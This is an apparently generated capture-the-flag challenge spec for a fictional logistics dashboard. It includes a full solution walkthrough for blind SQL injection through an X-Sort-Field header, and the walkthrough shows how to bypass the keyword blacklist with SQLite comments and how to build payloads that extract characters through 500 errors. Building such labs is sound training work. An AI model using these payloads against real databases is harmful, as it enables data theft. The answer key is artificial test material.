title: VeloVortex: Precision Routing manifest
description: Welcome to the VeloVortex Logistics Dashboard. As a coordinator, you have access to real-time shipment manifests and driver assignments. Our system is designed for maximum efficiency, allowing you to organize complex routes by any metric. We've recently implemented a new security middleware to scrub malicious inputs, ensuring our logistics data remains pristine. Explore the manifest and ensure the system is as secure as we claim.
solution:
1. Explore the application and log in as 'guest' / 'guest123'.
2. Navigate to the 'Shipment Manifest' page (/shipments).
3. Observe that clicking column headers sorts the table. Notice that the sorting is handled via an 'X-Sort-Field' HTTP Header in the request.
4. Test the header for SQL injection by sending 'X-Sort-Field: status, (CASE WHEN (1=1) THEN 1 ELSE 0 END)'. The page loads normally.
5. Test a false condition: 'X-Sort-Field: status, (CASE WHEN (1=2) THEN 1 ELSE 0 END)'. Notice the sort order remains the same or changes predictably.
6. Attempt a subquery: '(SELECT 1)'. The WAF triggers because the word 'SELECT' is blocked if followed by a space.
7. Bypass the WAF using SQLite comments: 'SELECT/**/setting_value/**/FROM/**/internal_audit'.
8. Use Boolean-based blind injection to leak the flag from the 'internal_audit' table where 'setting_key' is 'system_integrity_hash'.
9. Script a solution to iterate through characters: 'status, (CASE WHEN (SUBSTR((SELECT/**/setting_value/**/FROM/**/internal_audit/**/WHERE/**/setting_key="system_integrity_hash"),1,1)="L") THEN 1 ELSE (SELECT/**/1/**/UNION/**/SELECT/**/2) END)'. If the condition is false, the subquery returns two rows, causing a 500 error in SQLite when used as a scalar.

narrative_context.scenario:
VeloVortex Logistics recently expanded its global footprint by acquiring 'SwiftStream Regional', a specialist in last-mile delivery. As part of the merger, the IT department is under immense pressure to integrate SwiftStream's proprietary logistics tracking system into the centralized VeloVortex cloud environment before the end-of-quarter rush. The core of this integration is the 'ChronoPath Fleet Orchestrator,' a legacy application that manages hundreds of thousands of active shipments across three continents.

While VeloVortex maintains a robust security posture for its primary platforms, the ChronoPath dashboard was developed by a third-party contractor several years ago and contains significant technical debt. The internal security team, currently overwhelmed by the merger's infrastructure overhaul, has flagged the application for a rapid assessment. They are concerned that the search functionality used by logistics coordinators to filter through high-priority manifests might not have undergone the same rigorous code reviews as their native internal tools.
narrative_context.app_purpose: Allows logistics coordinators to search, filter, and assign drivers to complex delivery routes based on real-time shipment IDs and cargo categories.
narrative_context.data_theme: shipment manifests, driver license numbers, vehicle identification numbers (VIN), and GPS delivery coordinates

flavor_details.recent_event: A whistleblower from the acquired company suggested that the legacy search engine was 'held together with duct tape and raw queries' to meet the original launch date.

calibration_notes: Source analysis: The vulnerability is a SQL injection in the ORDER BY clause via the X-Sort-Field header. While it requires finding the injection point and bypassing a keyword blacklist, the blacklist is trivially circumvented because it only checks for keywords followed by a space (e.g., 'SELECT '), allowing bypasses using parentheses or other whitespace characters. The use of SQLite also simplifies exploitation as it allows for straightforward boolean-based or time-based extraction from the internal_audit tabl (target was 1.5)
